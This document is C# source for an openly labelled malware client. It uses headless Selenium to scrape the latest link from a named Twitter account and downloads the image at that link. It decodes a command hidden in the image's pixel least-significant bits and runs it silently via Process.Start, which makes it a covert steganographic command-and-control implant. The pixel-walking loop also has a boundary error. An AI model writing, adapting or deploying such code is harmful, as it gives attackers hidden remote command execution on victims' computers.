using OpenQA.Selenium;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Net;
using System.Drawing;
using System.Diagnostics;

namespace clientenet;

public class Malware
{
    private string command;

    public Malware()
    {
        this.command = "";
    }

    static void Main(string[] args)
    {
        Malware Mal = new();
        Mal.run();
    }

    public void run()
    {
        string imageUrl = this.getLastTweetLink();
        string command = this.GetCommand(imageUrl);
        this.command = command;
        this.RunCommand(command);
    }

    public void RunCommand(string command)
    {
        ProcessStartInfo info = new ProcessStartInfo(command);
        info.UseShellExecute = false;
        info.RedirectStandardError = true;
        info.RedirectStandardInput = true;
        info.RedirectStandardOutput = true;
        info.CreateNoWindow = true;
        info.ErrorDialog = false;
        info.WindowStyle = ProcessWindowStyle.Maximized;

        Process process = Process.Start(info);
    }

    public string GetCommand(string imageUrl)
    {
        WebClient client = new WebClient();
        Stream stream = client.OpenRead(imageUrl);
        Bitmap bitmap = new Bitmap(stream);

        string command = this.DecodeImage(bitmap);

        stream.Flush();
        stream.Close();
        client.Dispose();

        return command;
    }

    public string DecodeImage(Bitmap imageToDecode)
    {
        int width = imageToDecode.Width;
        int x = 0;
        int y = 0;
        string word = "";
        string tempword;
        while (true)
        {
            tempword = "";
            for (int j = 1; j <= 3; j++)
            {
                Color pixel = imageToDecode.GetPixel(x, y);
                if (j == 3)
                {
                    tempword += this.GetPixelBin(pixel, true);

                    word += (char)Convert.ToInt32(tempword, 2);
                    int endBit = Convert.ToInt32(pixel.B);
                    bool isEnded = endBit % 2 != 0;
                    if (isEnded)
                    {
                        return word;
                    }
                }
                else
                {
                    tempword += this.GetPixelBin(pixel);
                }

                if (x == width)
                {
                    x = 0;
                    y++;
                }
                else
                {
                    x++;
                }
            }
        }
    }

    public string getLastTweetLink()
    {
        string path = this.isDebug() ? Directory.GetParent(Environment.CurrentDirectory).Parent.Parent.FullName : Directory.GetCurrentDirectory();

        IWebDriver driver;
        try
        {
            EdgeOptions edgeOptions = new EdgeOptions();
            edgeOptions.AddArgument("--headless");

            driver = new EdgeDriver(path + @"\drivers\", edgeOptions);
        }catch(Exception e)
        {
            ChromeOptions chromeOptions = new ChromeOptions();
            chromeOptions.AddArgument("--headless");

            driver = new ChromeDriver(path + @"\drivers\", chromeOptions);
        }


        driver.Navigate().GoToUrl("https://twitter.com/AlexanderUwUola");
        var wait = new WebDriverWait(driver, TimeSpan.FromMinutes(1));
        wait.IgnoreExceptionTypes(typeof(NoSuchElementException), typeof(ElementNotVisibleException));
        wait.Until(e =>
        {
            try
            {

                return driver.FindElement(By.XPath("//a[@rel='noopener noreferrer nofollow']")).Displayed;
            }
            catch (StaleElementReferenceException)
            {
                return false;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        });
        string tweetLink = driver.FindElement(By.XPath("//a[@rel='noopener noreferrer nofollow']")).GetAttribute("href");
        driver.Quit();

        return tweetLink;
    }

    private string GetPixelBin(Color pixel, bool isEnd = false)
    {
        int[] colors = { Convert.ToInt32(pixel.R), Convert.ToInt32(pixel.G), Convert.ToInt32(pixel.B) };
        int size = isEnd ? 2 : 3;

        string binPixel = "";
        for (int i = 0; i < size; i++)
        {
            binPixel += (colors[i] % 2 == 0) ? "0" : "1";
        }
        return binPixel;
    }

    private bool isDebug()
    {
#if DEBUG
        return true;
#else
        return false;
#endif
    }

    public string GetCommand()
    {
        return this.command;
    }
}

